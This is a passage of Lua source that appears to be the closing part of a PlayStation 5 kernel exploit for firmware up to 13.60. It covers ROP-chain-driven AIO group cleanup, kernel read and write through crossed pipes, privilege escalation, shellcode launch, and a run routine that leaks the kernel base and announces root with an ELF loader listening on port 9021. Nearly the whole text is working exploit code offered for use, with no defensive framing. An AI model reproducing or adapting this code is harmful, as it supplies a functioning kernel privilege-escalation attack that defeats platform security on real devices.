            if ok then break end
            group_write64(shared + off.aio.group.waiters, uint64(0))
            local _, back = group_read64(shared + off.aio.group.waiters)
            ok = back.l == 0 and back.h == 0
        end
        return ok
    end
    local function clear_individually()
        local cleared, failed = 0, 0
        fast_stage_profile.aio_clear_fallback_ids =
            (fast_stage_profile.aio_clear_fallback_ids or 0) + count
        for _, shared in ipairs(candidates) do
            if clear_one(shared) then cleared = cleared + 1 else failed = failed + 1 end
        end
        return cleared, failed
    end

    -- Batch pipe retargeting and I/O only for the supported pipe layout.
    if off.pipe.count ~= 0 or off.pipe.size ~= 0x0c or off.pipe.buffer ~= 0x10 then
        return clear_individually()
    end

    local chain = ropchain({ stack_size = 0x30000, ops_only = true })
    if not chain.ops_only then
        return clear_individually()
    end

    local result_buffer = memory.alloc(count * 6 * 8)
    local verify_buffer = memory.alloc(count * 8)
    local result_index = 0
    local function push_syscall_result(number, ...)
        chain:push_syscall(number, ...)
        chain.ops[#chain.ops].ret_addr = result_buffer + result_index * 8
        result_index = result_index + 1
    end
    local function queue_aim(shared, length)
        chain:push_write_qword_memory(aim_buffer, uint64(length))
        chain:push_write_qword_memory(aim_buffer + 8, uint64(pipe_size) << 32)
        chain:push_write_qword_memory(aim_buffer + off.pipe.buffer, shared)
        push_syscall_result(syscall.write, master.write_fd, aim_buffer, 0x18)
        push_syscall_result(syscall.read, master.read_fd, drain_buffer, 0x18)
    end

    for index, shared in ipairs(candidates) do
        local waiter_addr = shared + off.aio.group.waiters
        queue_aim(waiter_addr, 0)
        chain:push_write_qword_memory(scratch_qword, uint64(0))
        push_syscall_result(syscall.write, victim.write_fd, scratch_qword, 8)

        queue_aim(waiter_addr, 8)
        push_syscall_result(syscall.read, victim.read_fd, verify_buffer + (index - 1) * 8, 8)
    end

    local ran = pcall(function() chain:execute_through_coroutine() end)
    fast_stage_profile.aio_clear_batches = (fast_stage_profile.aio_clear_batches or 0) + 1
    fast_stage_profile.aio_clear_batch_ids = (fast_stage_profile.aio_clear_batch_ids or 0) + count

    local results, verify = nil, nil
    if ran then
        results = memory.read_buffer(result_buffer, count * 6 * 8)
        verify = memory.read_buffer(verify_buffer, count * 8)
    end

    local function read_u32_le(data, offset)
        local b1, b2, b3, b4 = string.byte(data, offset, offset + 3)
        if not b4 then return nil end
        return b1 | (b2 << 8) | (b3 << 16) | (b4 << 24)
    end
    local function result_is(data, slot, expected)
        local offset = (slot - 1) * 8 + 1
        return read_u32_le(data, offset) == expected and read_u32_le(data, offset + 4) == 0
    end

    local cleared, failed = 0, 0
    for index, shared in ipairs(candidates) do
        local base = (index - 1) * 6
        local verified = results ~= nil
            and result_is(results, base + 1, 0x18)
            and result_is(results, base + 2, 0x18)
            and result_is(results, base + 3, 8)
            and result_is(results, base + 4, 0x18)
            and result_is(results, base + 5, 0x18)
            and result_is(results, base + 6, 8)
        if verified then
            local read_offset = (index - 1) * 8 + 1
            verified = read_u32_le(verify, read_offset) == 0
                and read_u32_le(verify, read_offset + 4) == 0
        end
        if verified then
            cleared = cleared + 1
        else
            fast_stage_profile.aio_clear_fallback_ids =
                (fast_stage_profile.aio_clear_fallback_ids or 0) + 1
            if clear_one(shared) then cleared = cleared + 1 else failed = failed + 1 end
        end
    end
    return cleared, failed
end

local function group_read_pointer(address)
    local rv, value = group_read64(address)
    if rv == 0 and is_kernel_pointer(value) then return value end
    return nil
end

lookup_aio_group = function(table_addr, id, page_count, page_cache, slot_scratch)
    local id_table = off.aio.idTable
    local index = bit32.band(id, 0x1fff)

    if page_count == nil then
        local page_count_rv
        page_count_rv, page_count = group_read32(table_addr + id_table.pages)
        if page_count_rv ~= 0 then return nil end
    end
    if page_count == 0 or page_count > 64 then return nil end
    if index >= bit32.lshift(page_count, 7) then return nil end

    local page_index = bit32.rshift(index, 7)
    local page_entry = page_cache and page_cache[page_index]
    local page = page_entry and page_entry.address
    if not page_entry then
        page = group_read_pointer(table_addr + page_index * 8)
        if page then
            page_entry = { address = page }
            if crossed then
                local image = memory.alloc(128 * id_table.slotStride)
                if group_read_block(page, 128 * id_table.slotStride, image) == 0 then
                    page_entry.image = image
                    fast_stage_profile.aio_page_snapshots = (fast_stage_profile.aio_page_snapshots or 0) + 1
                else
                    fast_stage_profile.aio_page_fallbacks = (fast_stage_profile.aio_page_fallbacks or 0) + 1
                end
            end
            if page_cache then page_cache[page_index] = page_entry end
        end
    end
    if not page then return nil end

    local slot_index = bit32.band(id, 0x7f)
    local slot = page + slot_index * id_table.slotStride
    local group, entry_type, state, generation
    if crossed then
        local fields = slot_scratch or scratch_group
        if page_entry.image then
            fields = page_entry.image + slot_index * id_table.slotStride + 0x10
            fast_stage_profile.aio_cached_slots = (fast_stage_profile.aio_cached_slots or 0) + 1
        elseif group_read_block(slot + 0x10, 0x1c, fields) ~= 0 then
            return nil
        end
        group = memory.read_qword(fields)
        entry_type = memory.read_dword(fields + 0x10):tonumber()
        state = memory.read_dword(fields + 0x14):tonumber()
        generation = memory.read_dword(fields + 0x18):tonumber()
    else
        local generation_rv
        generation_rv, generation = group_read32(slot + 0x28)
        if generation_rv ~= 0 then return nil end
        local state_rv
        state_rv, state = group_read32(slot + 0x24)
        if state_rv ~= 0 then return nil end
        local type_rv
        type_rv, entry_type = group_read32(slot + 0x20)
        if type_rv ~= 0 then return nil end
        group = group_read_pointer(slot + 0x10)
    end

    if bit32.band(bit32.bor(bit32.lshift(bit32.band(generation, 0xffff), 13), index), 0xffff) ~= id then
        return nil
    end
    if bit32.rshift(state, 16) ~= 3 then return nil end
    if bit32.band(entry_type, 0xffff) ~= id_table.entryType then return nil end
    if not is_kernel_pointer(group) then return nil end
    return group
end

defuse_aio_groups = function()
    if not curproc then
        report("cleanup", "current process is missing")
        return false
    end

    local _, table_addr = group_read64(curproc + off.proc.aioInfo)
    if not is_kernel_pointer(table_addr) then
        report("cleanup", "aio table pointer is invalid")
        return false
    end

    local num_off, state_off, waiters_off = off.aio.group.num, off.aio.group.state, off.aio.group.waiters
    local total, already_clear, cleared, skipped, failed = 0, 0, 0, 0, 0
    local pending_clears = {}
    local page_count_rv, cached_page_count = group_read32(table_addr + off.aio.idTable.pages)
    if page_count_rv ~= 0 or cached_page_count == 0 or cached_page_count > 64 then
        cached_page_count = nil
    end
    local page_cache = {}

    for _, ids in ipairs(armed_groups) do
        for _, id in ipairs(ids) do
            total = total + 1

            local group = lookup_aio_group(table_addr, id, cached_page_count, page_cache, scratch_group)
            if not group then
                skipped = skipped + 1
            else
                local shared = group_read_pointer(group + 0x10)
                if not shared then
                    skipped = skipped + 1
                else
                    local group_num, group_state, head
                    local fields_ok = true
                    if crossed then
                        fields_ok = group_read_block(shared, waiters_off + 8, scratch_group) == 0
                        if fields_ok then
                            group_num = memory.read_dword(scratch_group + num_off):tonumber()
                            group_state = memory.read_dword(scratch_group + state_off):tonumber()
                            head = memory.read_qword(scratch_group + waiters_off)
                        end
                    else
                        local _
                        _, group_num = group_read32(shared + num_off)
                        _, group_state = group_read32(shared + state_off)
                        _, head = group_read64(shared + waiters_off)
                    end

                    if not fields_ok then
                        skipped = skipped + 1
                    elseif group_num ~= 1 or group_state < 1 or group_state > 4 then
                        skipped = skipped + 1
                    elseif head.l == 0 and head.h == 0 then
                        already_clear = already_clear + 1
                    else
                        pending_clears[#pending_clears + 1] = shared
                        if #pending_clears >= 8 then
                            local batch_cleared, batch_failed = clear_aio_waiters_batch(pending_clears)
                            cleared = cleared + batch_cleared
                            failed = failed + batch_failed
                            pending_clears = {}
                        end
                    end
                end
            end
        end
    end

    if #pending_clears > 0 then
        local batch_cleared, batch_failed = clear_aio_waiters_batch(pending_clears)
        cleared = cleared + batch_cleared
        failed = failed + batch_failed
    end

    local ok = skipped == 0 and failed == 0 and (cleared + already_clear) == total
    defused = true
    fast_stage_profile.aio_cleanup_counts = {
        total = total, cleared = cleared, already_clear = already_clear,
        skipped = skipped, failed = failed,
    }
    if not ok then
        report("cleanup", string.format("aio cleanup failed (%d skipped, %d failed)", skipped, failed))
    end
    return ok
end

-- shellcode

launch_shellcode = function()
    return kexp.launch({
        kbase = kbase,
        proc_fd_addr = proc_fd_addr,
        off = off,
        master = master,
        victim = victim,
        curproc = curproc,
        restore_thread_attributes = restore_thread_attributes,
        kaddr = kaddr,
        report = report,
        hex = hex,
        stage = stage,
        prot_rwx = PROT_RWX,
        libkernel_handle = LIBKERNEL_HANDLE,
        libc_handle = LIBC_HANDLE,
        kread_fast = kread_fast,
        kwrite_fast = kwrite_fast,
        profile_start = fast_stage_start,
        profile_stop = fast_stage_stop,
        on_handoff = function() handed_off = true end,
    })
end
-- restore

restore_oids = function()
    if not crossed then return end
    local a, b, c, original_kind = off.oid.a, off.oid.b, off.oid.c, off.oid.originalKind

    for _, oid in ipairs({ a, b, c }) do
        kwrite64(kaddr(oid.arg1), kaddr(oid.arg1Value))
    end
    for _, oid in ipairs({ a, b, c }) do
        kwrite32(kaddr(oid.kind), original_kind)
    end
    kwrite32(kaddr(b.visible), 0)
    kwrite32(kaddr(a.deadSink), 0)
    kwrite32(kaddr(off.walkCounter.addr), 0)

    mib_c = nil

    local cpus_rv = sysctl_read_int(mib_a)
    local still_visible = oid_kind(mib_b) ~= nil
    local ok = cpus_rv == 0 and not still_visible
    if not ok then report("Cleanup", "oid restore check failed") end
end

restore_pipes = function()
    if not crossed or pipes_disarmed then return true end
    if not saved_pipe_buffers then
        report("Cleanup", "original pipe buffers were not saved; pipes remain armed")
        return false
    end

    local buffer_off, size_off = off.pipe.buffer, off.pipe.size
    local fields = {
        { master.pipe, saved_pipe_buffers.master, saved_pipe_buffers.master_size },
        { victim.pipe, saved_pipe_buffers.victim, saved_pipe_buffers.victim_size },
    }
    for _, field in ipairs(fields) do
        local pipe, buffer, size = field[1], field[2], field[3]
        kwrite64(pipe + buffer_off, buffer)
        kwrite32(pipe + size_off, size)
        kwrite32(pipe + off.pipe.count, 0)
        kwrite32(pipe + off.pipe["in"], 0)
        kwrite32(pipe + off.pipe.out, 0)
    end

    local master_rv, master_buffer = kread64(master.pipe + buffer_off)
    local victim_rv, victim_buffer = kread64(victim.pipe + buffer_off)
    local master_size_rv, master_size = kread32(master.pipe + size_off)
    local victim_size_rv, victim_size = kread32(victim.pipe + size_off)
    local ok = master_rv == 0 and victim_rv == 0 and master_size_rv == 0 and victim_size_rv == 0
        and master_buffer.l == saved_pipe_buffers.master.l and master_buffer.h == saved_pipe_buffers.master.h
        and victim_buffer.l == saved_pipe_buffers.victim.l and victim_buffer.h == saved_pipe_buffers.victim.h
        and master_size == saved_pipe_buffers.master_size and victim_size == saved_pipe_buffers.victim_size
    if ok then
        pipes_disarmed = true
        crossed = false
        ok_msg("original pipe buffers restored and verified")
    else
        report("Cleanup", "pipe restoration failed; pipes may panic on close")
    end
    return ok
end

restore_eboot_segments = function()
    if not eboot_segments_ptr then return end
    kwrite64(eboot_segments_ptr + 0x08, eboot_orig_addr)
    kwrite64(eboot_segments_ptr + 0x10, eboot_orig_size)

    local _, back = kread64(eboot_segments_ptr + 0x10)
    if back.l ~= eboot_orig_size.l or back.h ~= eboot_orig_size.h then
        report("Cleanup", "eboot segment bounds were not restored")
    end
end

release_aio_workers = function()
    if not worker_park then return end
    local ok = pcall(function()
        sysint(syscall.close, worker_park.write_fd)
        sleep(120, "ms")
        sysint(syscall.close, worker_park.read_fd)
    end)
    if not ok then report("Cleanup", "could not release aio workers") end
end

close_scratch_descriptors = function()
    local keep = {}
    if master then table.insert(keep, master) end
    if victim then table.insert(keep, victim) end

    local seen = {}
    for _, fd in ipairs(fds) do
        if not seen[fd] then
            seen[fd] = true
            local keep_fd = false
            for _, pipe in ipairs(keep) do
                if pipe.read_fd == fd or pipe.write_fd == fd then
                    keep_fd = true
                    break
                end
            end
            if not keep_fd then sysint(syscall.close, fd) end
        end
    end
end

-- run

stop = function(why)
    report("Kernel", "stopped: " .. why)
    return { kbase = kbase, done = true, payloads = false, stopped = true }
end

rescue = function()
    local ok = pcall(function()
        if pinned_core ~= nil and not thread_attrs_restored then
            restore_thread_attributes()
        end

        if #armed_groups > 0 and not defused then
            stage("repairing aio groups")
            if not curproc then find_current_process() end
            if curproc then
                defuse_aio_groups()
            else
                report("Cleanup", "current process unavailable")
            end
        end

        restore_eboot_segments()
        if not restore_pipes() then
            if master and victim
                and kexp.bump_refcount(master.read_file, kread32, kwrite32)
                and kexp.bump_refcount(master.write_file, kread32, kwrite32)
                and kexp.bump_refcount(victim.read_file, kread32, kwrite32)
                and kexp.bump_refcount(victim.write_file, kread32, kwrite32) then
                report("Cleanup", "pipe file references pinned after restoration failure")
            else
                report("Cleanup", "could not pin pipe file references after restoration failure")
            end
        end
        restore_oids()
        release_aio_workers()
        close_scratch_descriptors()
    end)
    if not ok then report("Cleanup", "failed") end
end

run = function()
    stage("Starting kernel exploit")

    local ok, result = pcall(function()
        local started_sec, started_nsec = fast_stage_start()
        leak_kernel_base()
        fast_stage_stop("leak_kernel_base", started_sec, started_nsec)
        ok_msg("kbase: " .. hex(kbase))

        started_sec, started_nsec = fast_stage_start()
        pin_to_single_core()
        fast_stage_stop("pin_to_single_core", started_sec, started_nsec)

        started_sec, started_nsec = fast_stage_start()
        local rw_ready = arm_kernel_read_write()
        fast_stage_stop("arm_kernel_read_write", started_sec, started_nsec)
        if not rw_ready then return stop("armings did not complete") end
        stage("kernel r/w ready")

        started_sec, started_nsec = fast_stage_start()
        local process_found = find_current_process()
        fast_stage_stop("find_current_process", started_sec, started_nsec)
        if not process_found then return stop("curproc not found") end

        started_sec, started_nsec = fast_stage_start()
        local pipes_found = locate_pipes()
        fast_stage_stop("locate_pipes", started_sec, started_nsec)
        if not pipes_found then return stop("pipes not located") end
        stage("pipes located")

        started_sec, started_nsec = fast_stage_start()
        local pipes_crossed = cross_pipes()
        fast_stage_stop("cross_pipes", started_sec, started_nsec)
        if not pipes_crossed then return stop("fast read and write not established") end
        stage("kernel fast r/w ready")

        stage("checking aio groups")
        started_sec, started_nsec = fast_stage_start()
        defuse_aio_groups()
        fast_stage_stop("defuse_aio_groups", started_sec, started_nsec)

        stage("checking privileges")
        started_sec, started_nsec = fast_stage_start()
        local privileges_ready = escalate()
        fast_stage_stop("escalate", started_sec, started_nsec)
        if not privileges_ready then return stop("escalation did not clear") end
        stage("privileges ready")

        started_sec, started_nsec = fast_stage_start()
        local payloads = launch_shellcode()
        fast_stage_stop("launch_shellcode", started_sec, started_nsec)
        stage(payloads and "payloads loaded" or "finished")
        return { kbase = kbase, done = true, payloads = payloads }
    end)

    rescue()

    if not ok then
        report("Kernel", tostring(result))
        error(result)
    end

    return result
end

local function shared_key(name)
    -- shared/ is keyed by the binary type, so "kexp.bin" and "kexp-v0.8.bin"
    -- both resolve to the same prefetched bytes.
    if not (shared_bytes and shared_prefetch) then return nil end
    local lower = name:lower()
    if lower:find("kexp") then return "kexp" end
    if lower:find("elfldr") then return "elfldr" end
    return nil
end

local function find_payload_file(configured_name, fallback_name)
    local sdir = (get_savedata_path and get_savedata_path()) or "/savedata0/"
    if configured_name and not configured_name:find("@@") then
        local p = sdir .. configured_name
        if file_exists(p) then return p end
    end
    if fallback_name then
        local p = sdir .. fallback_name
        if file_exists(p) then return p end
    end
    if get_title_id then
        local title = get_title_id()
        for _, slot in ipairs({"000", "001", "002"}) do
            local base = string.format("/mnt/sandbox/%s_%s/savedata0/", title, slot)
            if configured_name and not configured_name:find("@@") and file_exists(base .. configured_name) then
                return base .. configured_name
            end
            if fallback_name and file_exists(base .. fallback_name) then
                return base .. fallback_name
            end
        end
    end
    -- Nothing in savedata: fall back to the loader's shared/ directory.
    local key = nil
    if configured_name and not configured_name:find("@@") then key = shared_key(configured_name) end
    if not key and fallback_name then key = shared_key(fallback_name) end
    if key then return "shared:" .. key end
    return nil
end

local MAX_SUPPORTED_FIRMWARE = "13.60"

function relapse_kexploit()
    if is_jailbroken() then
        print("[*] process is already jailbroken, nothing to do")
        return
    end

    local elfldr_path = find_payload_file("@@ELFLDR_FILE@@", "elfldr-ps5.elf")
    local kexp_path = find_payload_file("@@KEXP_FILE@@", "kexp.bin")

    if not elfldr_path or not kexp_path then
        print("[-] elfldr or kexp binary missing from savedata0, update autoloader savedata")
--        return
    end

    print("[+] Credits: maj0r, ntfargo, ufm42, Sonic_Iso, Jordy, Dr. Yenyen, TheFlow, SlidyBat, Flatz, " ..
        "cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion")

    off = get_relapse_offset()
    if not off then
        if compare_version and compare_version(FW_VERSION, MAX_SUPPORTED_FIRMWARE) > 0 then
            printf("[-] firmware %s is newer than 13.60, which is not supported", tostring(FW_VERSION))
        else
            printf("[-] firmware %s is not supported", tostring(FW_VERSION))
        end
        return
    end

    printf("[+] Firmware %s", FW_VERSION)

    local result = run()
    if result and result.payloads then
        print("[+] kernel exploit complete, we are root!")
        local ip_ok, console_ip = pcall(get_current_ip)
        if not ip_ok or not console_ip then console_ip = "unknown" end
        print("[+] elfldr is listening on " .. console_ip .. ":9021")
        _G.IS_KEXP = true
    elseif result and result.stopped then
        print("[+] kernel exploit stopped")
    elseif result then
        print("[+] kernel exploit complete, root privileges enabled")
        _G.IS_KEXP = true
    end
end

relapse_kexploit()

